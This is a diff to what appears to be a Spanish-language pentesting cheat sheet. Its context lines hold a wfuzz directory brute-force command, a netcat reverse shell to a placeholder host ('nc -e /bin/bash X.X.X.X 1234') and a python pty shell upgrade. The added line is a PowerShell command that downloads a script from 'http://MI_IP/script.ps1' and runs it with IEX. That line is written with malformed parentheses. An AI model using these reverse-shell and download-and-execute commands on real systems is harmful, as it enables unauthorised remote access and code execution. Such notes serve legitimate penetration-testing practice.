@@ -20,6 +20,7 @@ wfuzz -c --hc=404 -t 500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-me
 ##REVERSE SHELL##
 nohup nc -e /bin/bash X.X.X.X 1234 & --> shell con proceso independiente
 https://gtfobins.github.io
+start /b C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX()New-Object Net.WebClient)downloadString('http://MI_IP/script.ps1')) --> mejorar shell
 
 ##UPGRADE SHELL1##
 echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
